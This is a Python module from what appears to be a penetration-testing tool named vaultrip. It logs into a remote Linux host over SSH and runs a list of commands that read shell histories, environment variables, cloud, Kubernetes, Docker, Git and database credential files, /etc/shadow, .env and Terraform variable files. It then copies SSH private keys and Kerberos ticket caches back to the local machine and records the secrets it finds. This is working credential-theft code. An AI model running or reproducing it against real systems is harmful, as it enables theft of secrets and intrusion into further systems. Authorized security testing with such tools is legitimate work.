# SPDX-License-Identifier: AGPL-3.0-or-later
# Copyright (c) 2026 CommonHuman-Lab
"""
Remote credential harvesting via SSH.

Connects to a remote Linux host using commonhuman_core.ssh.SshClient,
runs a series of credential-harvesting commands, and parses the output
using the same patterns as the local scanner.
"""

from __future__ import annotations

import logging
import os
import tempfile

from commonhuman_core.ssh import SshClient
from commonhuman_payloads.creds.patterns import ALL_PATTERNS

from ..reporter import Confidence, FileCredFinding, ScanResult

log = logging.getLogger("vaultrip.remote")


# Commands to run on the remote host to gather credential material
_HARVEST_COMMANDS = [
    ("bash_history", "cat ~/.bash_history 2>/dev/null | head -2000"),
    ("zsh_history",  "cat ~/.zsh_history 2>/dev/null | head -2000"),
    ("env_dump",     "env 2>/dev/null"),
    ("ssh_keys",     "find ~/.ssh -type f -name 'id_*' 2>/dev/null | head -20"),
    ("aws_creds",    "cat ~/.aws/credentials 2>/dev/null"),
    ("kube_config",  "cat ~/.kube/config 2>/dev/null"),
    ("docker_cfg",   "cat ~/.docker/config.json 2>/dev/null"),
    ("git_creds",    "cat ~/.git-credentials 2>/dev/null"),
    ("pgpass",       "cat ~/.pgpass 2>/dev/null"),
    ("netrc",        "cat ~/.netrc 2>/dev/null"),
    ("my_cnf",       "cat ~/.my.cnf 2>/dev/null"),
    ("shadow_root",  "cat /etc/shadow 2>/dev/null"),
    ("krb5ccache",   "ls /tmp/krb5cc_* 2>/dev/null"),
    ("keytab",       "ls /etc/krb5.keytab 2>/dev/null"),
    ("env_files",    "find / -maxdepth 5 -name '.env' -readable 2>/dev/null | head -10 | xargs cat 2>/dev/null"),
    ("terraform",    "find / -maxdepth 6 -name '*.tfvars' -readable 2>/dev/null | head -5 | xargs cat 2>/dev/null"),
]


def run(
    result: ScanResult,
    *,
    ssh_host: str,
    ssh_user: str,
    ssh_key: str | None = None,
    ssh_password: str | None = None,
    ssh_port: int = 22,
    timeout: int = 30,
) -> None:
    """Connect via SSH and harvest credentials from the remote host."""
    log.info("remote: connecting to %s@%s:%d", ssh_user, ssh_host, ssh_port)
    try:
        client = SshClient.connect(
            host=ssh_host,
            user=ssh_user,
            key_path=ssh_key,
            password=ssh_password,
            port=ssh_port,
            timeout=timeout,
        )
    except OSError as exc:
        result.append_error(f"SSH connection to {ssh_host} failed: {exc}")
        log.warning("remote: SSH connect failed: %s", exc)
        return

    with client:
        for label, command in _HARVEST_COMMANDS:
            try:
                stdout, _stderr, _code = client.run(command, timeout=timeout)
            except (OSError, TimeoutError) as exc:
                log.debug("remote: command '%s' failed: %s", label, exc)
                continue

            if not stdout.strip():
                continue

            _scan_output(result, label, stdout, ssh_host)

            if label == "ssh_keys":
                _fetch_ssh_keys(result, client, stdout.strip(), ssh_host)

        _fetch_ccache(result, client, ssh_host, timeout)


def _scan_output(result: ScanResult, label: str, text: str, host: str) -> None:
    for pattern in ALL_PATTERNS:
        match = pattern.pattern.search(text)
        if not match:
            continue
        value = match.group(1) if match.lastindex else match.group(0)
        confidence = Confidence.HIGH if pattern.confidence == "high" else Confidence.MEDIUM
        result.append_file(FileCredFinding(
            path=f"ssh://{host}::{label}",
            service=_service_from_label(label, pattern.name),
            credential_type=pattern.cred_type,
            confidence=confidence,
            value=value.strip()[:200],
        ))
        log.info("remote: pattern [%s] matched in %s output from %s", pattern.name, label, host)


def _fetch_ssh_keys(
    result: ScanResult,
    client: SshClient,
    key_listing: str,
    host: str,
) -> None:
    for line in key_listing.splitlines():
        path = line.strip()
        if not path:
            continue
        try:
            raw = client.get_file(path)
        except OSError as exc:
            log.debug("remote: cannot fetch %s from %s: %s", path, host, exc)
            continue
        text = raw.decode("utf-8", errors="replace")
        if "PRIVATE KEY" in text:
            encrypted = "ENCRYPTED" in text
            result.append_file(FileCredFinding(
                path=f"ssh://{host}:{path}",
                service="ssh",
                credential_type="private_key",
                confidence=Confidence.HIGH if not encrypted else Confidence.MEDIUM,
                value=None,
            ))
            log.info("remote: SSH private key: %s on %s (encrypted=%s)", path, host, encrypted)


def _fetch_ccache(
    result: ScanResult,
    client: SshClient,
    host: str,
    timeout: int,
) -> None:
    stdout, _, _ = client.run("ls /tmp/krb5cc_* 2>/dev/null", timeout=timeout)
    for remote_path in stdout.strip().splitlines():
        remote_path = remote_path.strip()
        if not remote_path:
            continue
        try:
            raw = client.get_file(remote_path)
        except OSError as exc:
            log.debug("remote: cannot fetch ccache %s from %s: %s", remote_path, host, exc)
            continue

        tmp_path = ""
        try:
            with tempfile.NamedTemporaryFile(suffix=".ccache", delete=False) as tmp:
                tmp.write(raw)
                tmp_path = tmp.name
            from .kerberos import parse_ccache
            parse_ccache(result, tmp_path)
        finally:
            if tmp_path:
                try:
                    os.unlink(tmp_path)
                except OSError:
                    pass


def _service_from_label(label: str, pattern_name: str) -> str:
    service_map = {
        "bash_history": "shell", "zsh_history": "shell",
        "aws_creds": "aws", "kube_config": "kubernetes",
        "docker_cfg": "docker", "git_creds": "git",
        "pgpass": "postgresql", "my_cnf": "mysql",
        "netrc": "netrc", "shadow_root": "linux",
        "env_files": "env", "env_dump": "env",
        "terraform": "terraform",
    }
    return service_map.get(label, pattern_name.split("_")[0])
